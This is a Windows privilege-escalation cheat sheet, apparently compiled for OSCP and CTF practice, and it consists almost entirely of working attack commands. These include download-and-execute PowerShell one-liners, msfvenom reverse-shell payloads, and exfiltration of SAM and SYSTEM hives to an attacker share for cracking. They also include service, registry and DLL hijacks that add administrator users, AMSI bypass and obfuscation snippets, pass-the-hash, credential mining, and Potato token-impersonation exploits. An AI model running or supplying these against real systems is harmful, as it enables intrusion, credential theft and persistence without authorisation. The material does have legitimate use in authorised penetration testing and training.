# Windows PrivEsc


# Scripts
```
https://github.com/carlospolop/PEASS-ng
https://github.com/PowerShellMafia/PowerSploit # Privesc/PowerUp
https://github.com/Tib3rius/windowsprivchecker
https://github.com/bitsadmin/wesng
        windows-exploit-suggester.py –update
        windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt


https://github.com/411Hall/JAWS
	
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
```
# Tools
```
https://github.com/bitsadmin/nopowershell  
https://github.com/rasta-mouse/AmsiScanBufferBypass  
https://github.com/cobbr/InsecurePowerShell  
https://github.com/BC-SECURITY/Empire # Or any other C2 framework but this one was fun to use from THM   
https://github.com/BC-SECURITY/Starkiller  
https://github.com/besimorhino/powercat
```

```powershell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

```powershell
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1') 
```
### Arch before making shells!
Careful of x64,x32,x86_64 etc funtimes with windows!

### Sysinternals is your friend
[download-index](https://docs.microsoft.com/en-us/sysinternals/downloads/)

###  msfvenom shells 

Extension for AlwaysInstallElevated == msi
Extension for Dynamic-Linked-Libraries == dll //not done a reverse shell from a dll but maybe possible..

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST= $ATTACKBOX LPORT=$PORT -f exe -o reverse.exe
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py $hostdirectory
copy \\$ATTACKBOX\$hostdirectory\reverse.exe C:\Path\reverse.exe
```

 Drop NC for one liner webserver

```
while(1) { cat index.html | nc -w1 -l -p 8080 }         
```

# General Enumeration:
```powershell
setspn -T medin -Q  */*        # extract all accounts in the SPN - service principle name - service and account mapping
ver                            # get version
tasklist /svc                  # list all services
tasklist /m                    # list all processes and dlls
systeminfo                     # list system information
hostname                       #
vssadmin                       # volume shadow copy service admin # need admin may one day be useful
wmic qfe get Caption,Description,HotFixId,InstalledOn           # Patch level!
wmic qfe list                  # LIST patch history!!!
$PSVersionTable.PSVersion

findstr /si string *.extension # find patterns from current directory and recursively

# Driver Queries
driverquery
sc query windefend # requires NAME use get-ciminstance here for memory
sc queryex type=service
get-ciminstance -namespace root/securitycenter2 -classname antivirusproduct

# Hotfix levels
get-hotfix
get-hotfix | format-list | findstr InstalledOn
get-hotfix | format-table hotfixid
get-hotfix -ID  # specific information

# User and Admin Enumeration
whoami /priv
net user # "" insert user name if required with quotes 
get-netuser | out-gridview
get-netuser | select -expandproperty lastlogon
(Get-NetUser).name
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
Get-LocalUser -Name "Administrator" | Select Name,SID
# Logged in
query user /server:$SERVER


# WMi-Obejcts
Get-WmiObject win32_useraccount | Select name,sid
gvmi win32_userprofile
#Get Computer system information
Get-WMIObject Win32_ComputerSystem
#Get Computer name from available System information
Get-WMIObject Win32_ComputerSystem| Select-Object -ExpandProperty Name
#Get Domain name from available System Information
Get-WMIObject Win32_ComputerSystem| Select-Object -ExpandProperty Domain

net localgroup # "" insert group name if required with quotes
Get-Net-Group
Get-NetGroupMember "Domain Admins"
Get-NetUsers -Domain

get-netdomaincontroller

cmdkey /list # Saved Creds!

# Software
get-executionpolicy -list
set-executionpolicy bypass -scope process # Change executionpolicy
wmic product get name,version,vendor
wmic service list brief
wmic service list brief | findstr  "Running"
sc qc <service>

# Network Enumeration
Get-NetComputer -ping
netstat -ano # -a displays all active connections, -n prevents name resolution, -o display the pid for each connection
arp -a
ipconfig /all                                    # check dns server
1..15 | %(echo "10.10.10.$_"; ping -n 1 10.10.10.$_ | Select-String tt1)         # ip ping sweep 
1..1024 | %(echo ((New-Object Net.Sockets.TcpCLient).Connect("10.10.10.10", $_)) "Open port on - $_" 2>$null # Port scan

# Important locations
C:\Windows\System32\drivers\etc\hosts           DNS entries
\System32\drivers\etc\networks                  Network Settings
\System32\drivers\config\SAM
\repair\Sam                                     THESE ARE BOTH BACK SAM files

# World Writable Files and Directories
accesschk.exe -uwdqs "Users" "c:\*" /accepteula
accesschk.exe -uwdqs "Authenticated Users" "c:\*" /accepteula
accesschk.exe -uwdqs "Everyone" "c:\*" /accepteula
accesschk.exe -uwqs "Users" * /accepteula
accesschk.exe -uwqs "Authenticated Users" * /accepteula
accesschk.exe -uwqs "Everyone" * /accepteula

# ConsoleHost history file:
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
(Get-PSReadlineOption).HistorySavePath

# Task related
schtasks /query /fo LIST /v

```

# Insecure service permissions
```
accesschk.exe /accepteula -uwcqv <user> <service> # sysinternals
sc qc <service>
sc config <service> binpath= "pathtoreverseshell.exe"
net start <service>
```

# Unquoted Service Path
Either 
```wmic
wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””
```
Meterpreter
```msfconsole
use exploit/windows/local/trusted_service_path
```
PowerSploit

```powershell
sc qc unquotedsvc # Query a service that has binary path name that is UNQUOTED AND CONTAINS SPACES
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" # sysinternals
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe 
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
net start unquotedsvc
```
[Pentestlab](https://pentestlab.blog/2017/03/09/unquoted-service-path/)

# Insecure service executables
```
sc qc filepermsvc # Find a service that runs with SYSTEM privileges
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe" # sysinternals - check writability
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y # replace the filepermservice.exe
net start filepermsvc # or sc start filepermsvc
```

# Insecure World Writable Program Files and User Directories (icacls)
```
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
icacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
icacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
icacls "C:\Documents and Settings\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users"
icacls "C:\Users\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users"
echo.
# (cacls for older versions of Windows)
cacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
cacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
cacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
cacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
cacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
cacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"
cacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
cacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
cacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "Everyone"
cacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "Everyone"
cacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
cacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
cacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "Everyone"
cacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
cacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "Everyone"
cacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
cacls "C:\Documents and Settings\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users"
cacls "C:\Users\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users"
```

# Autorun executables
```
# WARNING
# BEWARE
# FOR this to work you would have to restart a box
# OSCP exam or CTFs probably want you to turn off the *sigh* box  
#
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe" # sysinternals - check writablity
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y # copy reverse shell and overwrite the autorun
# restart system
```

# AlwaysInstalledElevated
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # Query Both
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # If both keys are set 1 (0x1)
# kali box:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKBOX LPORT=$PORT -f msi -o reverse.ms # Beware of Arch
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

# Backup SAM and SYSTEM files
```
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\ # These can often be transfered and cracked
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
```

# Passwords in the registry
```
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" # For admin autologons!
winexe -U 'admin%password' //MACHINE_IP cmd.exe # Kali winexe
```

# Registry keys containing passwords queries:
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

# Weak registry permissions
```
sc qc regsvc # Find weak registry permission, a service that runs with SYSTEM privileges
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc # sysinternals
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f 
net start regsvc
```
# Finding services with modifiable registry values
```
accesschk.exe -kvqwsu "Authenticated Users" hklm\system\currentcontrolset\services /accepteula
accesschk.exe -kvqwsu "Users" hklm\system\currentcontrolset\services /accepteula
accesschk.exe -kvqwsu "Everyone" hklm\system\currentcontrolset\services /accepteula
```

# Saved Credentials:
```cmd
cmdkey /list                                    list saved credentials
runas /savecred /user:admin reverse_shell.exe   query /savedcred
```

Autologon Credentials
```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon 
```

# Password Mining Configuration Files
```
# Look for Unattend.xml used by sysadmins to setup systems, should be deleted.
# Finding unquoted service path vulnerabilities
wmic service get name,displayname,pathname,startmode | Sort
#NEED A powershell command to find the unquoted path pipe
sc qc [service]        #  to query binary path service
```

# Passwords in Unattended.xml
```
C:\Windows\Panther\Unattend\Unattended.xml
```

# Password Mining Memory
```
# Attack box
msfconsole:
use auxiliary/server/capture/http_basic
set uripath x
run
# browser -> http://atackbox_address/x
# open cmd
taskmgr
# right-click iexplorer.exe of "Image Name" column
# select "Create Dump File"
# Copy file to attack box
# On attack box
strings dump.DMP | grep "Authorization: Basic"
echo -ne base64string | base64 -d
```

# Passing the hash
```
pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe # Full hashes delimitereed by colon.

# Alternative:

responder.py #TODO!!
```

# Scheduled Tasks
```
\accesschk.exe /accepteula -quvw user C:\ScheduleTask.ps1 # systernals - if running as SYSTEM
# If writable:
echo reverseShell.exe >> C:\ScheduleTask.ps1 # append .exe
```

# Insecure GUI Apps
```
tasklist /V # GUI apps that can be run as Admin 
# In file dialogue box 
file://c:/windows/system32/cmd.exe
```

# Startup Applications 
```
# BEWARE YOU NEED TO RESTART/LOGOFF! Requires trigger!
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" # sysinternals
# Create a shortcut to your reverse shell in StartUp directory.
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# place reverse shell in C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

# Service Escalation Registry
```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
Copy ‘C:\service.c # Edit file, either on box or on attack box, depending on local compiler and noise:
# replace or add a system() function call to:
"cmd.exe /k net localgroup adminstrators [username] /add"
# x86_64-w64-mingw32-gcc windows_service.c -o x.exe
# Copy back to /Temp
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f # Edit path
sc start regsvc
netlocalgroup administrators # check success
```

# DLL hijacking!
```
# Find a dll to exploit
# Get the windows_dll.c
# Edit, replacing the system() call to:
cmd.exe /k net localgroup administrators user /add
#compile
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
# place the dll
sc stop dllsvc 
sc start dllsvc # Or start a service that use it.
```

# Powershell downgrade
```powershell
powershell -version 2
full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
```

# binPath
```
accesschk64.exe -wuvc daclsvc # sysinternals - if user has SERVICE_CHANGE_CONFIG permission
sc config daclsvc binpath="net localgroup administrators [username] /add"
sc start daclsvc
net localgroup administrators
```

# Kernel exploits for the BRAVE
```
msfconsole -> use multi/handler -> set payload - >set lhost -> run
# msfvenom your tailoured shell for targeting architecture professionalism
# copy shell to Windows box and run it
# On attack box
run post/multi/recon/local_exploit_suggester
# For example 
# identify exploit/windows/local/ms16_014_wmi_recv_notif
set session [sessionnumber]
set lport [portnumber]
run
```

# Rogue Potato - Token Impersonation
```
sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
C:\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe # triggered on ADMIN use
C:\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999 # in local service reverse shell run exploit
``` 
# Hot Potato
```powershell
powershell.exe -nop -ep bypass
https://github.com/Kevin-Robertson/Tater.git
Import-Module C:\Path\To\HotPotato.ps1
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

# PrintSpoofer - Token Impersonation
```
C:\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe # triggered on ADMIN use
C:\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i # in local service reverse shell run exploit
```
